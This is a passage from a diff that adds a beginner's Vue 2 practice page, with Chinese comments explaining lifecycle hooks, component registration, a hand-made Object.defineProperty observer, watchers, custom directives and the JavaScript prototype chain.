+            //实例已完成数据绑定，但还没有开始渲染过程。
+            //此时实例的属性和方法都可以使用，且依赖的计算属性和方法的计算结果是最新的。
+            mounted(){
+                console.log('mounted')
+                console.log(this)
+            },
+            //数据是新的，但页面是旧的
+            beforeUpdate(){
+                console.log('beforeUpdate')
+                console.log(this)
+                debugger
+            },
+            //数据和页面都已更新，DOM 更新完毕。
+            updated(){
+                console.log('updated')
+                console.log(this)
+                debugger
+            },
+            //常用的生命钩子：清除定时器，取消订阅消息，解绑自定义事件。
+            //这一步，实例仍然完全可用，this 仍能获取到实例。在这个阶段一般进行关闭定时器，取消订阅消息，解绑自定义事件。
+            //这一步对数据的更新不会再触发lifcycle钩子，因为数据变化不会再触发视图更新。
+            beforeDestroy(){
+                console.log('beforeDestroy')
+                console.log(this)
+            },
+            //实例销毁
+            //销毁后vue开发者工具看不到任何信息
+            //自定义事件会失效但原生dom时间依然有效
+            //一般不在beforedestory操作数据，因为即使操作数据也不会再触发更新流程
+            // Vue 实例指示的所有东西都会解绑定，所有的自定义事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务端渲染期间不被调用。
+            destroyed(){
+                console.log('destroyed')
+                console.log(this)
+            },
+
+            
+            //template选项用于定义当前组件的模板，可以是字符串模板，也可以是编译器模板。
+            //template选项也可以是方法，返回一个字符串模板或编译器模板。
+            //template选项也可以是异步函数，返回一个Promise对象。
+            //会直接替代root元素
+            //不带div会报错
+            // template:
+            //     `
+            //     <div id="root">
+            //         <h1>{{name}}</h1>
+            //         <h2>{{url}}</h2>
+            //     <div>
+            //     `
+            
+            
+            
+            //第二步：注册组件（局部注册）
+            components: {
+                //我们在root写的标签：上面定义的组件实例
+                teacher:teacher,
+                student: st
+                // ES6简写形式
+                // teacher,
+                // student
+            }
+
+            
+        })
+
+        //el的另一种写法
+        console.log(Vue.config.devtools)
+        x.$mount('#root')
+
+      
+        function Observer(obj){
+                    const keys = Object.keys(obj)
+                    keys.forEach((key)=>{
+                        Object.defineProperty(this,key,{
+                            get(){
+                                return obj[key]
+                            },
+                            set(newVal){
+                                console.log(`监听到${key}属性变化，将其设置为${newVal}`)
+                                obj[key] = newVal
+                            }
+                        })
+                    
+                    })
+                        
+                    
+                }
+        let data = {       
+            fullName:{
+                firstname:'haha',
+                lastname:'smile',
+            },
+            isHot:true,
+            members:[
+                {name:'haha1',id:1},
+                {name:'haha2',id:2},
+                {name:'haha3',id:3}
+            ]        
+        }
+        const obs = new Observer(data);
+        console.log(obs)
+
+
+       
+        //监视isHot的另一种写法
+        // x.$watch('isHot',function(newVal,oldVal){
+        //     console.log(`天气变化了，现在是${newVal? '热':'冷'}`)
+        // })
+
+        //深度监视isHot另一种写法
+        // x.$watch('isHot',{
+        //     immediate:true,
+        //     handler(newVal,oldVal){
+        //         console.log(`vuemodel.$watch:天气变化了，现在是${newVal? '热':'冷'}`)
+        //     }
+        // })
+        // //简写
+        // x.$watch('isHot',(newVal,oldVal)=>{
+        //     console.log(`vuemodel.$watch简写:天气变化了，现在是${newVal? '热':'冷'}`)
+        // })
+      
+
+        let number = 10;//如果age时person的属性，age：number，number被改变了，但是age不变
+       
+        let person = {
+            name:'hahaha',
+            sex:'woman'
+        }
+        //vue.set(第一个参数不可以是vuemodel或vuemodel.data)
+        // Vue.set(person,'age',1)
+        // x.$set(person,'age',18)
+        Object.defineProperty(person,'age',{
+            //指定访问器（getter 和 setter）和 value 或 writable 属性。这是不允许的，因为访问器和 value 或 writable 属性是互斥的。
+           // value:number,
+            enumable:true,//控制属性是否可以枚举，颜色相对于person原来的属性较浅,默认false
+            //writable:true,//控制属性是否可以被修改，默认false
+            //configurable:true,//控制属性是否可以被删除
+            //get函数(getter)
+            //如果age时person的属性，age：number，number被改变了，age变
+            get:function(){
+                return number;
+            },
+            //set函数（setter)
+            //修改属性的值，且会收到修改的值
+            set(value){
+                console.log(value)
+                number = value
+            }
+        })
+
+
+      
+        //全局指令
+        // Vue.directive('big',function(element,b){
+        //     console.log(element)
+        //     element.innerText = b.value * 10
+        // })
+        //配置对象中常用的3个回调：
+        // bind：指令与元素成功绑定时调用。
+        // inserted：指令所在元素被插入页面时调用。
+        // update：指令所在模板结构被重新解析时调用。
+        //    Vue.directive('fbind',{
+        //     //指令与元素成功绑定时（一上来）调用
+        //     bind(element,b){
+        //         cnosole.log('指令与元素成功绑定时（一上来）调用')
+        //         element.value = b.value
+        //     },
+        //     //指令所在元素被插入页面时调用
+        //     inserted(element,b){
+        //         console.log('指令所在元素被插入页面时调用')
+        //     },
+        //     //指令所在模板被重新解析时调用
+        //     update(element,b){
+        //         console.log('指令所在模板被重新解析时调用')
+        //         element.value = b.value
+        //     }
+            
+            
+        //    })
+
+   
+        function Demo(){
+            this.a = 1
+            ,
+            this.b = 2
+        }
+        let demo = new Demo()
+        console.log('demo.__proto__'+demo.__proto__)//隐式实例属性
+        console.log('Demo.prototype'+Demo.prototype)//显式实例属性
+        console.log('demo.__proto__ === Demo.prototype'+demo.__proto__ === Demo.prototype)
+        //程序员通过显示原型属性操作，追加一个x属性，值为99
+        Demo.prototype.x = 99
+        console.log('demo.x'+demo.x)
+        console.log('demo.__proto__.x'+demo.__proto__.x)
+        console.log(Object.getOwnPropertyNames(demo))//实例属性
+        console.log(Object.getOwnPropertyNames(Demo.prototype))//原型属性
+
+
+    
+    </script>
+
+</body>
+</html>
